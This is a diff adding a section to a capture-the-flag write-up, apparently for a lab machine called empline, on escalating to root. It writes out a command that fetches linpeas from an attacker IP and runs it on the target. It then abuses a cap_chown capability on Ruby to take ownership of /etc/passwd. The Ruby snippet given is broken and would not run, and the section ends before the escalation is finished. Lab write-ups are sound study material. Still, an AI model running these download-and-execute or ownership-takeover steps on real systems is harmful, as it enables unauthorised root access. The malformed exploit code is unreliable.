@@ -264,4 +264,59 @@ The flag is in george's home directory
 
 ## Root.txt flag
 
+At this point I decided to upload linpeas to the machine, and since we own george's home directory, we have write privileges.
+
+### Uploading linpeas
+
+On attacker's machine, start a http server in the same directory that linpeas is stored
+
+> ┌──(root㉿kali)-[/home/…/Desktop/THM/practice/linpeas]
+> └─# python3 -m http.server 4444
+> Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
+
+And on the empline machine:
+
+> george@empline:~$ wget http://10.18.42.194:4444/linpeas.sh
+> 
+> --2023-05-09 11:25:44--  http://10.18.42.194:4444/linpeas.sh
+> 
+> Connecting to 10.18.42.194:4444... connected.
+> 
+> HTTP request sent, awaiting response... 200 OK
+> 
+> Length: 830030 (811K) [text/x-sh]
+> 
+> Saving to: ‘linpeas.sh’
+> 
+> linpeas.sh          100%[===================>] 810.58K   501KB/s    in 1.6s    
+> 
+> 2023-05-09 11:25:46 (501 KB/s) - ‘linpeas.sh’ saved [830030/830030]
+> 
+> george@empline:~$ chmod +x linpeas.sh 
+> 
+> george@empline:~$ ./linpeas.sh
+
+
+Linpeas discovered /usr/local/bin/ruby = cap_chown+ep. After doing some research I came across this link: https://ruby-doc.org/stdlib-2.4.1/libdoc/fileutils/rdoc/FileUtils.html.
+
+Chown changes owner and group of the named files!
+
+Let's check our user id:
+
+> george@empline:~$ id
+>
+>uid=1002(george) gid=1002(george) groups=1002(george)
+>
+>george@empline:~$ 
+
+
+Lets create a new ruby file:
+
+> nano exploit.rb
+
+We'll write some code to change the file permissions of /etc/passwd using our ID:1002:
+
+> File = File("/etc/passwd","r")
+> File.chown(1002,1002)
+
 
